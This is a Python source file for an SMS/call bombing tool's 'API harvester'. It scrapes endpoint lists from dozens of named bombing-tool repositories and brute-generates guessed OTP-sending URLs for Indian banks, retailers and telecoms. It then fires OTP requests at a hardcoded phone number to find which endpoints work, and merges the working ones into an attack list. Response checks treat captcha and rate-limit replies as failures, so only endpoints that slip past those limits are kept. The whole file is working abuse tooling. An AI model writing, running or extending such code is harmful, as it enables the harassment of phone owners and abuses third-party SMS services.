"""
Spectra7 API Harvester — ingests from 40+ bombing tools, self-tests, merges.
"""
import json, os, re, time
from concurrent.futures import ThreadPoolExecutor, as_completed
try:
    import requests
except ImportError:
    requests = None

DATA_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "data")
HARVESTER_FILE = os.path.join(DATA_DIR, "harvester_results.json")
API_FILE = os.path.join(DATA_DIR, "apis.json")
TARGET = "9876543210"
CC = "91"

# ---------------------------------------------------------------------------
# Known bomb-tool GitHub repos that carry apidata.json or similar
# ---------------------------------------------------------------------------
BOMB_TOOL_SOURCES = [
    ("MX-Solvers/MaxBomb", "main", "apidata.json"),
    ("ansal3322/SmS-BomB", "main", "apidata.json"),
    ("bhattigurjot/SMS-Bombing", "main", "apidata.json"),
    ("pradeep12820/SMS-Bombing", "main", "apidata.json"),
    ("anonymouis009/SMS-Bomber", "main", "apidata.json"),
    ("Misry22/SMS-BOMBER", "main", "apidata.json"),
    ("iMro0o0o0o/TeraBomb", "main", "apidata.json"),
    ("Bhanukabhashitha/SMS-Bombing", "main", "apidata.json"),
    ("AlienXali/SMS-Bomber", "main", "apidata.json"),
    ("B2ee/Sms-Boom", "main", "apidata.json"),
    ("root-Hunta/King-Bombing", "main", "apidata.json"),
    ("Burning-Hacker/TXTBomb", "main", "apidata.json"),
    ("kashiwade-mushi/TeraBomb", "main", "apidata.json"),
    ("Yukki-0508/AIR-BOMBER", "main", "apidata.json"),
    ("boss2754/smsBombing", "main", "apidata.json"),
    ("MRS-027/Bombing", "main", "apidata.json"),
    ("FrozenGOD18/FROZEN-BOMBER", "main", "apidata.json"),
    ("DarkenPasiya/TeraBomb", "main", "apidata.json"),
    ("hackatl/SpamBomb", "main", "apidata.json"),
    ("MX-Solvers/MaxBomb", "main", "data.json"),
    ("MX-Solvers/MaxBomb", "main", "api.json"),
    ("tahaluindo/SpamSMS", "main", "spamsms.py"),
    ("ardiank01/Bomber", "main", "Bomber.py"),
    ("t0xic0der/sms-bombing-script", "main", "sms-bomb.py"),
    ("marnixkoops/SMS-Bomb", "main", "apidata.json"),
    ("MishaNixxy/SMS-Bombing", "main", "apidata.json"),
    ("Deepu-Roy/Bombing", "main", "apidata.json"),
    ("Hacking-repo/SMS-Bomber", "main", "apidata.json"),
    ("error404-notfound/SMS-Bomber", "main", "apidata.json"),
    ("STARK-bot/SMS-Bomber", "main", "apidata.json"),
    ("The-Master45/SMS-Bomber", "main", "apidata.json"),
    ("Frost177/NextBomb", "main", "apidata.json"),
    ("itxtol/SMS-Bomber", "main", "apidata.json"),
    ("shadow-15/SpamBomb", "main", "apidata.json"),
    ("Coder-Guru/SMS-Bomber", "main", "apidata.json"),
    ("MorphoBomb/Morpho", "main", "apidata.json"),
    ("hack3r-045/TeraBomb", "main", "apidata.json"),
    ("weirdflex/weirdbomber", "main", "apidata.json"),
]

RAW_BASE = "https://raw.githubusercontent.com/{repo}/{branch}/{file}"

# Headers to look like a normal browser
FETCH_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json, text/plain, */*",
}


def _fetch_json(url, timeout=15):
    if requests is None:
        return None
    try:
        r = requests.get(url, headers=FETCH_HEADERS, timeout=timeout)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None


def _fetch_text(url, timeout=15):
    if requests is None:
        return None
    try:
        r = requests.get(url, headers=FETCH_HEADERS, timeout=timeout)
        if r.status_code == 200:
            return r.text
    except Exception:
        pass
    return None


def _extract_api_from_python_source(text):
    """Parse Python source to extract API dicts."""
    apis = []
    if not text:
        return apis
    # Match dict patterns like {"name": "...", "url": "...", ...}
    dict_pattern = re.compile(
        r'\{\s*["\']name["\']\s*:\s*["\']([^"\']+)["\'].*?'
        r'["\']url["\']\s*:\s*["\'](https?://[^"\']+)["\'].*?\}',
        re.DOTALL
    )
    for m in dict_pattern.finditer(text):
        name = m.group(1)
        url = m.group(2)
        if "{" in url and ("target" in url or "number" in url or "phone" in url):
            # Determine method
            context_start = max(0, m.start() - 200)
            context = text[context_start:m.end() + 50]
            method = "POST"
            if re.search(r'method["\']\s*:\s*["\']GET["\']', context[:200]):
                method = "GET"
            apis.append({"name": name[:25], "method": method, "url": url})
    return apis


def scrape_source(repo, branch, file):
    """Scrape one bomb tool source. Returns list of candidate API dicts."""
    url = RAW_BASE.format(repo=repo, branch=branch, file=file)
    candidates = []

    if file.endswith(".json"):
        data = _fetch_json(url)
        if data:
            # Standard apidata.json format
            for section in ("sms", "call", "mail"):
                if section in data:
                    for cc_code in data[section]:
                        for entry in data[section][cc_code]:
                            if isinstance(entry, dict) and "url" in entry:
                                entry["_source"] = f"{repo}/{file}"
                                candidates.append(entry)
            # Also check for services list
            if "services" in data:
                for svc in data["services"]:
                    if isinstance(svc, dict) and "url" in svc:
                        svc["_source"] = f"{repo}/{file}"
                        candidates.append(svc)
    elif file.endswith(".py"):
        text = _fetch_text(url)
        if text:
            extracted = _extract_api_from_python_source(text)
            for e in extracted:
                e["_source"] = f"{repo}/{file}"
            candidates.extend(extracted)

    return candidates


def scrape_all_sources(max_per_source=200, workers=15):
    """Scrape all known bomb-tool sources."""
    all_candidates = []
    seen_urls = set()

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(scrape_source, repo, branch, f): (repo, f)
                   for repo, branch, f in BOMB_TOOL_SOURCES}
        for fut in as_completed(futures):
            repo, fname = futures[fut]
            try:
                candidates = fut.result()
                if candidates:
                    # Dedup by URL
                    unique = 0
                    for c in candidates:
                        u = c.get("url", "")
                        if u and u not in seen_urls:
                            seen_urls.add(u)
                            all_candidates.append(c)
                            unique += 1
                    print(f"  [{repo}/{fname}] {len(candidates)} found, {unique} new")
                else:
                    pass  # silent for empty sources
            except Exception:
                pass

    print(f"\n[harvester] Scraped {len(all_candidates)} unique API entries from bomb tools")
    return all_candidates


def _is_likely_success(status, body_lower):
    if status >= 400:
        return False
    pos_kw = ["otp sent", "otp has been sent", "otp send", "otp sended",
              "code sent", "code has been sent", "sent successfully",
              "a link to the app has been sent", "successfully sent",
              "resendSmsCounter", "otp_request_attempts", "success_code",
              "message has been sent", "we have sent"]
    neg_kw = ["invalid phone", "invalid mobile", "invalid number",
              "not registered", "not found", "rate limit", "too many",
              "blocked", "captcha", "attempt exceeded", "message can't"]
    for kw in neg_kw:
        if kw in body_lower:
            return False
    for kw in pos_kw:
        if kw in body_lower:
            return True
    try:
        flat = json.dumps(json.loads(body_lower)).lower()
        if '"success":true' in flat or '"status":200' in flat:
            return True
    except Exception:
        pass
    return False


def probe_api(api_config, timeout=8):
    name = api_config.get("name", "?")
    url = api_config.get("url", "").replace("{target}", TARGET).replace("{cc}", CC)
    params = {k: str(v).replace("{target}", TARGET).replace("{cc}", CC)
              for k, v in api_config.get("params", {}).items()}
    data = api_config.get("data", {})
    if isinstance(data, dict):
        data = {k: str(v).replace("{target}", TARGET).replace("{cc}", CC)
                for k, v in data.items()}
    json_body = api_config.get("json", None)
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
               "Accept": "application/json, text/plain, */*"}
    start = time.time()
    try:
        if json_body:
            resp = requests.post(url, json=json_body, params=params, headers=headers, timeout=timeout)
        elif isinstance(data, dict) and data:
            resp = requests.post(url, data=data, params=params, headers=headers, timeout=timeout)
        else:
            resp = requests.get(url, params=params, headers=headers, timeout=timeout)
        elapsed = time.time() - start
        body_lower = resp.text[:800].lower()
        success = _is_likely_success(resp.status_code, body_lower)
        return {"name": name, "url": api_config.get("url", ""),
                "http_status": resp.status_code, "success": success,
                "elapsed": round(elapsed, 2),
                "method": api_config.get("method", "GET")}
    except Exception as e:
        return {"name": name, "url": api_config.get("url", ""),
                "http_status": 0, "success": False,
                "elapsed": 0, "error": type(e).__name__}


def run_harvest(max_candidates=600, workers=30, timeout=8):
    print("[harvester] Phase 1: Scraping bomb tool sources...")
    scraped = scrape_all_sources(max_per_source=200, workers=15)

    print("[harvester] Phase 2: Generating pattern-based candidates...")
    patterns = _generate_candidates()
    all_candidates = scraped + patterns

    print(f"[harvester] Phase 3: Probing {len(all_candidates)} candidates...")
    results = []
    tested = 0
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(probe_api, dict(c), timeout): c for c in all_candidates[:max_candidates]}
        for fut in as_completed(futures):
            tested += 1
            r = fut.result()
            results.append(r)
            if r["success"]:
                print(f"  ✅ #{tested} {r['name'][:18]:18s} HTTP {r['http_status']} {r['elapsed']}s")
            elif tested % 100 == 0:
                w = sum(1 for x in results if x["success"])
                print(f"  ... {tested}/{len(all_candidates[:max_candidates])} tested, {w} working")

    working = [r for r in results if r["success"]]
    print(f"\n[harvester] Done: {len(working)}/{len(results)} working")

    os.makedirs(DATA_DIR, exist_ok=True)
    with open(HARVESTER_FILE, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2, default=str)

    return working


def merge_into_apis(working_apis):
    if os.path.exists(API_FILE):
        with open(API_FILE, encoding="utf-8") as f:
            apis = json.load(f)
    else:
        apis = {"sms": {"91": [], "multi": []}, "call": {"91": [], "multi": []}, "email": {"multi": []}}

    existing_urls = set()
    for atype in apis:
        for ccode in apis[atype]:
            for api in apis[atype][ccode]:
                existing_urls.add(api["url"])

    added = 0
    for r in working_apis:
        if r["url"] in existing_urls:
            continue
        url_raw = r.get("url", "")
        entry = {"name": r.get("name", "?")[:20], "method": r.get("method", "POST"), "url": url_raw}
        # Infer body format
        if "/requestOTP" in url_raw or "/auth/requestOTP" in url_raw:
            entry["json"] = {"contactNumber": "{target}"}
        elif "/get_app_link" in url_raw:
            entry["data"] = {"phone": "{target}"}
        elif "/login/otp" in url_raw or "/auth/login/otp" in url_raw:
            entry["data"] = {"phone_number": "{target}"}
        elif url_raw.endswith(".php") or "/getOtp" in url_raw or "/sendvcode" in url_raw:
            entry["method"] = "GET"
            entry["params"] = {"mobile": "{target}"}
        else:
            entry["json"] = {"phone": "{target}"}

        apis.setdefault("sms", {}).setdefault("91", []).append(entry)
        existing_urls.add(url_raw)
        added += 1

    with open(API_FILE, "w", encoding="utf-8") as f:
        json.dump(apis, f, indent=2)
    print(f"[harvester] Merged {added} new APIs into {API_FILE}")


def _generate_candidates():
    """Generate pattern-based candidates from known Indian services."""
    services = [
        "paytm", "flipkart", "amazon", "phonepe", "cred", "zomato",
        "swiggy", "ola", "uber", "rapido", "irctc", "bookmyshow",
        "myntra", "ajio", "meesho", "shopsy", "tatacliq", "nykaa",
        "lenskart", "urbancompany", "practo", "1mg", "netmeds",
        "pharmeasy", "policybazaar", "acko",
        "icici", "hdfc", "sbi", "axisbank", "kotak", "yesbank",
        "indusind", "jupiter", "fi", "slice", "khatabook",
        "makemytrip", "goibibo", "ixigo", "easemytrip", "yatra",
        "cleartrip", "redbus", "confirmtkt",
        "oyo", "treebo", "fabhotels",
        "housing", "magicbricks", "squareyards", "nobroker",
        "99acres", "makaan", "unacademy", "byjus", "vedantu",
        "jio", "airtel", "vi",
        "zepto", "blinkit", "instamart", "bigbasket", "grofers",
        "jiomart", "dmart", "justdial", "sulekha", "indiamart",
        "tataplay", "porter", "cityflo", "happyeasygo", "cashify",
        "snapdeal", "shopclues", "dream11", "indialends",
        "sharechat", "frotels", "gapoon", "allensolly",
        "nnnow", "kfc-in", "dominos",
        "zerodha", "groww", "upstox",
    ]
    bases = [
        ("send-otp", "POST", "json", "phone"),
        ("send_otp", "POST", "json", "phone"),
        ("sendOtp", "POST", "json", "mobileNumber"),
        ("request-otp", "POST", "json", "phone"),
        ("request_otp", "POST", "json", "phone"),
        ("requestOtp", "POST", "json", "phone"),
        ("requestOTP", "POST", "json", "contactNumber"),
        ("generate-otp", "POST", "json", "phone"),
        ("generate_otp", "POST", "json", "phone"),
        ("get-otp", "POST", "json", "phone"),
        ("get_otp", "POST", "json", "phone"),
        ("getOtp", "GET", "params", "number"),
        ("send-code", "POST", "json", "phone"),
        ("send_code", "POST", "json", "phone"),
        ("sendCode", "POST", "json", "phone"),
        ("send-verification-code", "POST", "json", "phone"),
        ("sendVerificationCode", "POST", "json", "phone"),
        ("sendPhoneOtp", "POST", "json", "phone"),
        ("phone-otp", "POST", "json", "phone"),
        ("send_app_link", "POST", "json", "phone"),
        ("get_app_link", "POST", "data", "phone"),
        ("sendvcode.php", "GET", "params", "mobile"),
        ("signupSendOTP", "POST", "json", "mobileNumber"),
        ("appDownloadLink", "POST", "json", "mobileNumber"),
        ("validateMobileOrEMail", "POST", "data", "mobileoremail"),
        ("userSignup", "POST", "data", "mobile"),
        ("auth/login/otp", "POST", "data", "phone_number"),
        ("auth/requestOTP", "POST", "json", "contactNumber"),
        ("auth/send-otp", "POST", "json", "phone"),
        ("api/send-otp", "POST", "json", "phone"),
        ("api/v1/send-otp", "POST", "json", "phone"),
        ("api/v2/send-otp", "POST", "json", "phone"),
        ("api/otp", "POST", "json", "phone"),
        ("user/otp/generate", "POST", "data", "loginId"),
        ("user/get_app_link", "POST", "data", "phone"),
        ("restservice/send_app_link_sms", "POST", "data", "phone"),
        ("website-app-download-link-sms", "POST", "data", "mobile_number"),
        ("otp/send", "POST", "json", "phone"),
        ("otp/request", "POST", "json", "phone"),
        ("otp/generate", "POST", "json", "phone"),
        ("sms/send", "POST", "json", "phone"),
        ("user/otp", "POST", "json", "phone"),
        ("forgot-password", "POST", "json", "phone"),
        ("reset-password", "POST", "json", "phone"),
        ("user/register", "POST", "json", "phone"),
        ("user/signup", "POST", "json", "phone"),
    ]
    candidates = []
    seen = set()
    for service in services:
        name_clean = re.sub(r'[^a-zA-Z0-9]', '', service.lower())
        for fmt in ["https://www.{}.com", "https://{}.com", "https://api.{}.com",
                     "https://login.{}.com", "https://m.{}.com",
                     "https://www.{}.in", "https://{}.in", "https://api.{}.in"]:
            base_domain = fmt.format(name_clean)
            for endpoint, method, mode, phone_key in bases:
                url = f"{base_domain}/{endpoint}"
                if url in seen:
                    continue
                seen.add(url)
                if mode == "params":
                    candidates.append({"name": service[:15], "method": method, "url": url,
                                       "params": {phone_key: "{target}"}, "identifier": ""})
                elif mode == "json":
                    candidates.append({"name": service[:15], "method": method, "url": url,
                                       "json": {phone_key: "{target}"}, "identifier": ""})
                else:
                    candidates.append({"name": service[:15], "method": method, "url": url,
                                       "data": {phone_key: "{target}"}, "identifier": ""})
    return candidates


def self_test(api_configs, workers=20, timeout=6):
    """Test a list of API configs. Returns list of results dicts."""
    results = []
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(probe_api, dict(a), timeout): a for a in api_configs}
        for fut in as_completed(futures):
            results.append(fut.result())
    return results


if __name__ == "__main__":
    working = run_harvest(max_candidates=500, workers=25, timeout=8)
    if working:
        merge_into_apis(working)
